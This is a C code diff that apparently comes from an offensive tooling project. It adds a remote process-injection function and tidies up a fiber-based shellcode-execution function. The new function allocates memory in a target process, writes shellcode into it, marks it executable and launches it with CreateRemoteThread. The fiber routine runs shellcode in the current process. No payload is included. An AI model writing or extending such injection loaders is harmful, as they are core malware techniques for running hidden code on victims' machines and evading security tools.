@@ -4,15 +4,30 @@
 
 
 
+int ShellcodeInjectSimple(HANDLE hProcess, char Shellcode[], int ShellcodeSize)
+{
+    // allocate shellcode space
+    PVOID ShellcodeLocation = VirtualAllocEx(hProcess, 0, ShellcodeSize, MEM_COMMIT, PAGE_READWRITE);
+    DWORD NoWrittenBytes = 0;
+	WriteProcessMemory(hProcess, ShellcodeLocation, Shellcode, ShellcodeSize, &NoWrittenBytes);
 
+
+    DWORD OldProtection = 0;
+    VirtualProtectEx(hProcess, ShellcodeLocation, ShellcodeSize, PAGE_EXECUTE_READWRITE, &OldProtection);
+
+
+    CreateRemoteThread(hProcess, NULL, NULL, ShellcodeLocation, NULL, NULL, NULL);
+
+
+}
 // Fiber injection
-int ThreadToFiber(char shellcode[], int shellcode_size) {
+int ThreadToFiber(char Shellcode[], int ShellcodeSize) {
     // switch thread to fiber
     PVOID Fiber = ConvertThreadToFiber(NULL);
 
     // allocate shellcode space
-    PVOID ShellcodeLocation = VirtualAlloc(0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    memcpy(ShellcodeLocation, shellcode, shellcode_size);
+    PVOID ShellcodeLocation = VirtualAlloc(0, ShellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(ShellcodeLocation, Shellcode, ShellcodeSize);
 
 
     // create fiber with shellcode
